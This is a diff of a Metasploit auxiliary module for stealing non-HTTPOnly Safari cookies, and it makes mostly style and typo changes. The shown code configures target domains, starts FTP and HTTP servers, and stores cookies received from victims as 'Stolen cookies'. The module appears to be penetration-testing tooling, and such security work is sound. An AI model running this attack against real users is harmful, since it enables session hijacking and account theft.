@@ -13,7 +13,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'        => "Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft",
+      'Name'        => 'Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft',
       'Description' => %q{
         A vulnerability exists in versions of OSX/iOS/Windows Safari released
         before April 8, 2015 that allows the non-HTTPOnly cookies of any
@@ -31,16 +31,16 @@ class Metasploit3 < Msf::Auxiliary
       'Actions'        => [ [ 'WebServer' ] ],
       'PassiveActions' => [ 'WebServer' ],
       'DefaultAction'  => 'WebServer',
-      'DisclosureDate' => "Apr 8 2015"
+      'DisclosureDate' => 'Apr 8 2015'
     ))
 
     register_options([
-      OptString.new("URIPATH", [false, 'The URI to use for this exploit (default is random)']),
-      OptPort.new('SRVPORT',   [true, "The local port to use for the FTP server", 5555 ]),
-      OptPort.new('HTTPPORT',  [true, "The HTTP server port", 8080]),
+      OptString.new('URIPATH', [false, 'The URI to use for this exploit (default is random)']),
+      OptPort.new('SRVPORT',   [true, 'The local port to use for the FTP server', 5555 ]),
+      OptPort.new('HTTPPORT',  [true, 'The HTTP server port', 8080]),
       OptString.new('TARGET_DOMAINS', [
         true,
-        "The comma-separated list of domains to steal non-HTTPOnly cookies from.",
+        'The comma-separated list of domains to steal non-HTTPOnly cookies from.',
         'apple.com,example.com'
       ])
     ], self.class )
@@ -48,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
   #
-  # Start the FTP aand HTTP server
+  # Start the FTP and HTTP server
   #
   def run
     start_service
@@ -58,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
   #
-  # Handle the HTTP request and return a response.  Code borrorwed from:
+  # Handle the HTTP request and return a response.  Code borrowed from:
   # msf/core/exploit/http/server.rb
   #
   def start_http(opts={})
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
     use_zlib
 
     comm = datastore['ListenerComm']
-    if (comm.to_s == "local")
+    if (comm.to_s == 'local')
       comm = ::Rex::Socket::Comm::Local
     else
       comm = nil
@@ -104,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
       'Path' => resource_uri
     }.update(opts['Uri'] || {})
 
-    proto = (datastore["SSL"] ? "https" : "http")
+    proto = (datastore['SSL'] ? 'https' : 'http')
     print_status("Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")
 
     if (opts['ServerHost'] == '0.0.0.0')
@@ -179,7 +179,7 @@ class Metasploit3 < Msf::Auxiliary
   # set.
   #
   def use_zlib
-    if (!Rex::Text.zlib_present? and datastore['HTTP::compression'] == true)
+    unless Rex::Text.zlib_present? || datastore['HTTP::compression'] == false
       fail_with(Failure::Unknown, "zlib support was not detected, yet the HTTP::compression option was set.  Don't do that!")
     end
   end
@@ -205,13 +205,13 @@ class Metasploit3 < Msf::Auxiliary
       domain = json['domain']
       cookie = Rex::Text.decode_base64(json['p']).to_s
       if cookie.length == 0
-        print_error "#{cli.peerhost}: No cookies found for #{domain}"
+        print_error("#{cli.peerhost}: No cookies found for #{domain}")
       else
         file = store_loot(
-          "cookie_#{domain}", "text/plain", cli.peerhost, cookie, 'cookie', "Stolen cookies"
+          "cookie_#{domain}", 'text/plain', cli.peerhost, cookie, 'cookie', 'Stolen cookies'
         )
-        print_good "#{cli.peerhost}: Cookies stolen for #{domain} (#{cookie.bytes.length} bytes): "
-        print_good file
+        print_good("#{cli.peerhost}: Cookies stolen for #{domain} (#{cookie.bytes.length} bytes): ")
+        print_good(file)
       end
       send_response(cli, 200, 'OK', '')
     else
